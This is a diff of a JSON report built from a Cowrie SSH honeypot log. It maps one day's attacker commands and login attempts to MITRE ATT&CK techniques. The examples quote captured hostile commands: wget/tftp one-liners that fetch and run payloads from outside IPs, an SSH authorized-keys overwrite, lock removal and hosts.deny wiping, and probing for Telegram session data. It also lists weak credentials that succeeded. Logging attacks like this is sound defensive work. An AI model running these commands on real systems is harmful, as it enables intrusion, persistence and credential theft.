@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-29 07:03:45",
+  "generated": "2026-09-29 08:01:20",
   "totals": {
-    "commands": 793,
-    "login_failed": 2194,
-    "login_success": 65,
-    "sessions": 2426
+    "commands": 867,
+    "login_failed": 2322,
+    "login_success": 74,
+    "sessions": 2575
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 2194,
+      "count": 2322,
       "examples": [
         "root / 12345Abc",
         "administrator / 1qazxsw2",
@@ -21,14 +21,14 @@
         "latoya / latoya1"
       ],
       "first": "2026-09-29T00:00:22.776997Z",
-      "last": "2026-09-29T07:03:36.673167Z",
-      "unique_ips": 49
+      "last": "2026-09-29T08:00:39.581640Z",
+      "unique_ips": 59
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 297,
+      "count": 316,
       "examples": [
         "cd ~; chattr -ia .ssh; lockr -ia .ssh",
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
@@ -37,14 +37,14 @@
         ">/var/run/.f && chmod 777 /var/run/.f && /var/run/.f && cd /var/run/;"
       ],
       "first": "2026-09-29T00:21:19.292312Z",
-      "last": "2026-09-29T06:54:30.947037Z",
-      "unique_ips": 25
+      "last": "2026-09-29T07:30:23.425301Z",
+      "unique_ips": 29
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 103,
+      "count": 125,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -53,14 +53,14 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-29T00:21:27.067552Z",
-      "last": "2026-09-29T06:43:27.071805Z",
-      "unique_ips": 15
+      "last": "2026-09-29T07:52:57.437986Z",
+      "unique_ips": 19
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 65,
+      "count": 74,
       "examples": [
         "root / Asdfghjk1",
         "root / root",
@@ -69,14 +69,14 @@
         "zabbix / zabbix"
       ],
       "first": "2026-09-29T00:21:18.787089Z",
-      "last": "2026-09-29T06:59:02.256562Z",
-      "unique_ips": 33
+      "last": "2026-09-29T07:52:56.464409Z",
+      "unique_ips": 40
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 27,
+      "count": 32,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -85,113 +85,142 @@
         "#!/bin/sh\n\nH=23.95.228.20\ncd /tmp 2>/dev/null || cd /var/tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd .\n\nA=$(uname -"
       ],
       "first": "2026-09-29T00:21:20.958251Z",
-      "last": "2026-09-29T06:43:09.479254Z",
-      "unique_ips": 15
+      "last": "2026-09-29T07:31:23.427374Z",
+      "unique_ips": 18
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 24,
+      "count": 29,
       "examples": [
         "w",
         "whoami",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
+        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-29T00:21:33.279861Z",
-      "last": "2026-09-29T06:43:25.373868Z",
-      "unique_ips": 13
+      "last": "2026-09-29T07:18:02.398118Z",
+      "unique_ips": 16
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 22,
+      "count": 28,
       "examples": [
         "crontab -l",
-        "top"
+        "top",
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'"
       ],
       "first": "2026-09-29T00:21:32.477629Z",
-      "last": "2026-09-29T06:43:22.761451Z",
-      "unique_ips": 11
+      "last": "2026-09-29T07:52:58.000449Z",
+      "unique_ips": 14
     },
     {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 12,
+      "count": 15,
       "examples": [
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1"
       ],
       "first": "2026-09-29T00:21:20.109461Z",
-      "last": "2026-09-29T06:43:09.285936Z",
-      "unique_ips": 12
+      "last": "2026-09-29T07:30:23.425301Z",
+      "unique_ips": 15
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 11,
+      "count": 14,
       "examples": [
-        "ls -lh $(which ls)"
+        "ls -lh $(which ls)",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
       ],
       "first": "2026-09-29T00:21:31.664696Z",
-      "last": "2026-09-29T06:43:18.291539Z",
-      "unique_ips": 11
+      "last": "2026-09-29T07:52:58.274046Z",
+      "unique_ips": 14
     },
     {
       "id": "T1070.004",
       "name": "Indicator Removal: File Deletion",
       "tactic": "Defense Evasion",
-      "count": 3,
+      "count": 6,
       "examples": [
-        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep"
+        "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-29T00:21:28.681871Z",
-      "last": "2026-09-29T06:33:42.268314Z",
-      "unique_ips": 3
+      "last": "2026-09-29T07:17:59.025874Z",
+      "unique_ips": 6
     },
     {
       "id": "T1489",
       "name": "Service Stop",
       "tactic": "Impact",
-      "count": 3,
+      "count": 5,
       "examples": [
         "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep"
       ],
       "first": "2026-09-29T00:21:28.681871Z",
-      "last": "2026-09-29T06:33:42.268314Z",
-      "unique_ips": 3
+      "last": "2026-09-29T07:17:59.025874Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1016",
+      "name": "System Network Configuration Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "ifconfig"
+      ],
+      "first": "2026-09-29T07:52:56.890329Z",
+      "last": "2026-09-29T07:52:56.890329Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 1,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+      ],
+      "first": "2026-09-29T07:15:34.099559Z",
+      "last": "2026-09-29T07:15:34.099559Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "/bin/busybox HISILICON",
-      60
+      63
     ],
     [
       "sh",
-      42
+      44
     ],
     [
       "shell",
-      42
+      44
     ],
     [
       "enable",
-      42
+      44
     ],
     [
       "system",
-      42
+      44
     ],
     [
       "ping; sh",
-      40
+      42
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      20
+      21
     ],
     [
       "/bin/busybox",
